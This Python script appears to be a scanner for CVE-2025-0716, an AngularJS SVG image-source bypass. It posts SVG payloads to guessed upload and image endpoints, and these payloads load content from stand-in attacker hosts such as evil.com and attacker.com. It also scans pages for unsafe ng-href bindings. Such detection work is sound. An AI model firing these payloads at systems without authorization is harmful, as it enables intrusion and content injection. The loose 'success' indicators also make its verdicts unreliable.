"""
CVE-2025-0716 Vulnerability Detection Script
AngularJS SVG Image Source Bypass - CVSS 2.9 (Medium)
HeroDevs Vulnerability Directory
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2025-0716 弱點
    AngularJS SVG 圖片來源繞過弱點
    影響版本: 所有 AngularJS 版本 (≥0.0.0)
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2025-0716: AngularJS SVG 圖片來源限制繞過，可載入不受信任的 SVG 內容',
        'remediation': '更新到 AngularJS NES 1.9.8 或 1.5.24，實施嚴格的 SVG 內容驗證和來源限制'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2025-0716 SVG 圖片來源繞過弱點...")
        
        # 檢測 AngularJS 和 SVG 使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller'
        ]
        
        svg_indicators = [
            '<svg',
            'ng-href',
            'xlink:href',
            'ng-attr-href',
            'image href'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_svg = any(indicator in response.text.lower() for indicator in svg_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        if not uses_svg:
            print("      [檢測] 未檢測到 SVG 使用，但繼續測試...")
        else:
            print("      [檢測] 發現 AngularJS 和 SVG 使用，開始檢測...")
        
        # 測試 SVG 圖片來源繞過
        test_endpoints = [
            '/api/image',
            '/api/upload',
            '/api/content',
            '/upload',
            '/image',
            '/content',
            '/media',
            '/gallery'
        ]
        
        # CVE-2025-0716 特定攻擊負載
        svg_bypass_payloads = [
            {
                'svg_content': '<svg><image ng-href="{{ \'https://untrusted.com/malicious.svg\' }}"></image></svg>',
                'description': 'ng-href bypass'
            },
            {
                'svg_content': '<svg><image xlink:href="https://evil.com/malicious.svg"></image></svg>',
                'description': 'xlink:href bypass'
            },
            {
                'svg_content': '<svg><image ng-attr-href="https://attacker.com/payload.svg"></image></svg>',
                'description': 'ng-attr-href bypass'
            },
            {
                'image_url': 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSBocmVmPSJodHRwczovL2V2aWwuY29tL21hbGljaW91cy5zdmciLz48L3N2Zz4=',
                'description': 'Base64 encoded SVG bypass'
            }
        ]
        
        for endpoint in test_endpoints:
            try:
                # 測試端點是否存在
                test_response = session.get(urljoin(target_url, endpoint), timeout=15)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload in svg_bypass_payloads:
                    try:
                        # 測試 POST 請求
                        post_data = {}
                        headers = {}
                        
                        if 'svg_content' in payload:
                            post_data = {'content': payload['svg_content']}
                            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                        elif 'image_url' in payload:
                            post_data = {'url': payload['image_url']}
                            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=post_data,
                            headers=headers,
                            timeout=15
                        )
                        
                        # 檢查回應是否接受了 SVG 內容
                        if response.status_code in [200, 201, 202]:
                            response_text = response.text.lower()
                            
                            # 檢查是否成功繞過了來源限制
                            bypass_indicators = [
                                'untrusted.com',
                                'evil.com',
                                'attacker.com',
                                'malicious.svg',
                                'uploaded',
                                'success',
                                'accepted',
                                'saved'
                            ]
                            
                            found_indicators = [ind for ind in bypass_indicators if ind in response_text]
                            
                            if found_indicators:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 SVG 圖片來源繞過弱點。{payload['description']} 成功繞過安全限制。回應包含: {', '.join(found_indicators)}。這表明攻擊者可以載入不受信任的 SVG 內容，可能導致 XSS 攻擊或惡意內容注入。"
                                return result
                        
                        # 測試 GET 請求參數
                        get_params = {}
                        if 'svg_content' in payload:
                            get_params = {'svg': payload['svg_content']}
                        elif 'image_url' in payload:
                            get_params = {'url': payload['image_url']}
                        
                        if get_params:
                            response = session.get(
                                urljoin(target_url, endpoint),
                                params=get_params,
                                timeout=15
                            )
                            
                            if response.status_code == 200:
                                # 檢查 SVG 內容是否被直接反映
                                if any(indicator in response.text.lower() for indicator in ['untrusted.com', 'evil.com', 'attacker.com']):
                                    result['vulnerable'] = True
                                    result['evidence'] = f"在端點 {endpoint} 發現 SVG 來源繞過弱點 (GET 參數)。{payload['description']} 成功繞過限制。"
                                    return result
                                    
                    except Exception as e:
                        continue
                        
            except Exception as e:
                continue
        
        # 測試現有頁面中的 SVG 弱點
        print("      [檢測] 分析現有頁面中的 SVG 實作...")
        
        # 檢查頁面中的 SVG 相關代碼
        svg_patterns = [
            r'ng-href\s*=\s*["\'][^"\']*["\']',
            r'xlink:href\s*=\s*["\'][^"\']*["\']',
            r'ng-attr-href\s*=\s*["\'][^"\']*["\']',
            r'<image[^>]+href\s*='
        ]
        
        found_svg_usage = []
        for pattern in svg_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_svg_usage.extend(matches)
        
        if found_svg_usage:
            print(f"      [檢測] 發現 {len(found_svg_usage)} 個 SVG 相關用法")
            
            # 檢查是否有不安全的實作
            unsafe_patterns = [
                'ng-href="{{ ',
                'ng-href="{{',
                'xlink:href="{{',
                'ng-attr-href="{{'
            ]
            
            unsafe_usage = []
            for usage in found_svg_usage:
                for unsafe_pattern in unsafe_patterns:
                    if unsafe_pattern in usage.lower():
                        unsafe_usage.append(usage)
                        break
            
            if unsafe_usage:
                result['vulnerable'] = True
                result['evidence'] = f"在頁面中發現不安全的 SVG 實作，可能受到 CVE-2025-0716 影響。發現 {len(unsafe_usage)} 個潛在弱點用法: {', '.join(unsafe_usage[:3])}..."
                return result
        
        # 檢查 Content Security Policy
        csp_header = response.headers.get('Content-Security-Policy', '')
        if csp_header:
            if 'img-src' in csp_header.lower():
                if '*' in csp_header or 'data:' in csp_header:
                    print("      [檢測] CSP 設定可能不足以防止 SVG 攻擊")
        
        result['evidence'] = f"完成 CVE-2025-0716 檢測。分析了 {len(test_endpoints)} 個端點和 {len(found_svg_usage)} 個 SVG 用法，未發現明確的 SVG 來源繞過弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result